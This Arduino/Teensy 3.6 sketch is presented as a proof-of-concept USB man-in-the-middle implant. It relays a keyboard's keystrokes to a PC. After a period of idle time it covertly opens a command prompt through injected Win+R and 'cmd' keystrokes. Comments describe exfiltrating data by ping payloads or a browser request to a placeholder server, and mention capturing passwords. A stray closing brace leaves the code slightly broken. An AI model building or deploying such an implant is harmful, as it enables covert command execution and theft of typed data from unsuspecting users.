// Proof of concept for the Teensy 3.6 MITM code


#include "USBHost_t36.h"


USBHost myusb;
USBHub hub1(myusb);
KeyboardController keyboard1(myusb);
MIDIDevice midi1(myusb);

unsigned long StartTime = millis(); // initialize time vars
unsigned long CurrentTime = millis();
unsigned long ElapsedTime = millis();

void setup()
{
  pinMode(13, OUTPUT);  // setup on-board LED
  while (!Serial) ; // wait for Arduino Serial Monitor
  Serial.println("USB Host Testing");
  myusb.begin();
  keyboard1.attachPress(OnPress);
}


void loop()
{
  CurrentTime = millis();
  ElapsedTime = CurrentTime - StartTime;
  delay(1000); // THIS MAY SLOW KEYBOARD SPEED, IT IS ONLY USED FOR DEBUGGING TO FLASH LED DURING WRITE
  digitalWrite(13, LOW);
  myusb.Task();
  midi1.read();
  
  if(ElapsedTime > 10000){ // wait 10 seconds (to ~50 days) to execute hidden function
    StartTime = CurrentTime; // stop infinite loop of cmds
    // open run window
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(100);
    // start command prompt
    Keyboard.print("cmd");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    delay(500);
    //a function is put here to send data to server, depends on what you want to run. You can even write a script and start it.
    // example function using ping, "start http://www.myserver.com/mydata" followed by CTRL+W may be better as it can send over 1000 characters
    // Keyboard.print("ping -p ") 
    // while (message needs to be sent){
    // Keyboard.print(up to 16 bytes)}
    // Keyboard.print("10.10.10.10 or www.hostserver.com")
  }
}


void OnPress(int key) // This is where key strokes are processed. This is where we can validate password, implement a last input timer
{
  CurrentTime = millis();
  digitalWrite(13, HIGH); // Flash LED to signify a key was pressed
  Keyboard.print((char)key); // Pipe keystroke to PC
  StartTime = CurrentTime;  // Reset timer, a key was pressed
  }
  //Serial.print("key "); // SERIAL DEBUGGING
  //Serial.print((char)keyboard1.getKey());
  //Serial.print("  ");
  //Serial.print((char)keyboard2.getKey());
  //Serial.println();
}
